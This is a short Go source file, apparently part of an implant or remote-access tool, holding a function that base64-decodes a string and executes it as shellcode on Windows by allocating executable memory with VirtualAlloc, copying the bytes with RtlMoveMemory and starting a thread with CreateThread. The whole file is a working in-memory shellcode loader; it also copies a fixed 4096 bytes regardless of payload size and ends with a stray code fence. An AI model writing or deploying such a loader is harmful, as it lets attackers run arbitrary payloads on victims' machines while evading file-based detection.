package components

import (
	"reflect"
	"syscall"
	"unsafe"
)

// Constants for Windows API function calls
const (
	MEM_COMMIT  = 0x1000
	MEM_RESERVE = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

// Windows API function declarations
var (
	procVirtualAlloc     = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualAlloc")
	procRtlMoveMemory    = syscall.NewLazyDLL("ntdll.dll").NewProc("RtlMoveMemory")
	procCreateThread     = syscall.NewLazyDLL("kernel32.dll").NewProc("CreateThread")
	procWaitForSingleObject = syscall.NewLazyDLL("kernel32.dll").NewProc("WaitForSingleObject")
)

func runShellCode(code string) string {
	shellcode := base64Decode(code)
	addr, _, _ := procVirtualAlloc.Call(0, 4096, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return "Shellcode failed..."
	}
	hdr := (*reflect.SliceHeader)(unsafe.Pointer(&shellcode))
	procRtlMoveMemory.Call(addr, hdr.Data, 4096)

	ht, _, _ := procCreateThread.Call(0, 0, addr, 0, 0, 0)
	if ht == 0 {
		return "Shellcode failed..."
	}
	_, _, _ = procWaitForSingleObject.Call(ht, syscall.INFINITE)
	if ht == 0 {
		return "Shellcode failed..."
	}
	return "Shellcode ran!"
}
```

